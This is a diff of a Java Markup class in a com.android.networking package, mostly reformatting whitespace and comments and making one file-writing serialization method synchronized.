@@ -32,7 +32,6 @@ import com.android.networking.module.BaseModule;
 import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
 
-
 /**
  * The Class Markup.
  */
@@ -88,7 +87,7 @@ public class Markup {
 	public Markup(BaseModule module, int id) {
 		this("MOD" + module.getType(), id);
 	}
-	
+
 	public Markup(BaseModule module, String id) {
 		this("MOD" + module.getClass() + "_" + id);
 	}
@@ -238,17 +237,15 @@ public class Markup {
 			return null;
 		}
 	}
-	
-/*	public int readMarkupInt() throws IOException{
-		byte[] data = readMarkup();
-		int value = ByteArray.byteArrayToInt(data, 0);
-		return value;		
-	}
-	
-	public void writeMarkupInt(int value){
-		byte[] data = ByteArray.intToByteArray(value);
-		writeMarkup(data);
-	}*/
+
+	/*
+	 * public int readMarkupInt() throws IOException{ byte[] data =
+	 * readMarkup(); int value = ByteArray.byteArrayToInt(data, 0); return
+	 * value; }
+	 * 
+	 * public void writeMarkupInt(int value){ byte[] data =
+	 * ByteArray.intToByteArray(value); writeMarkup(data); }
+	 */
 
 	/**
 	 * Removes the markup.
@@ -285,7 +282,7 @@ public class Markup {
 
 		if (Cfg.DEBUG) {
 			Check.asserts(markupName != "", "markupName empty"); //$NON-NLS-1$ //$NON-NLS-2$
-		}		
+		}
 
 		final AutoFile fileRet = new AutoFile(markupName);
 
@@ -306,7 +303,7 @@ public class Markup {
 		return fileRet.exists();
 	}
 
-	public boolean writeMarkupSerializable(final Serializable object) throws IOException {
+	public synchronized boolean writeMarkupSerializable(final Serializable object) throws IOException {
 		final ByteArrayOutputStream bos = new ByteArrayOutputStream();
 		final ObjectOutput out = new ObjectOutputStream(bos);
 		out.writeObject(object);
@@ -334,9 +331,9 @@ public class Markup {
 	}
 
 	public <T extends Serializable> T unserialize(T empty) {
-		if(isMarkup()){
+		if (isMarkup()) {
 			try {
-				T ret =  (T) readMarkupSerializable();
+				T ret = (T) readMarkupSerializable();
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (unserialize): " + ret);//$NON-NLS-1$
 				}
@@ -344,7 +341,7 @@ public class Markup {
 			} catch (IOException e) {
 				return empty;
 			}
-		}else{
+		} else {
 			return empty;
 		}
 	}
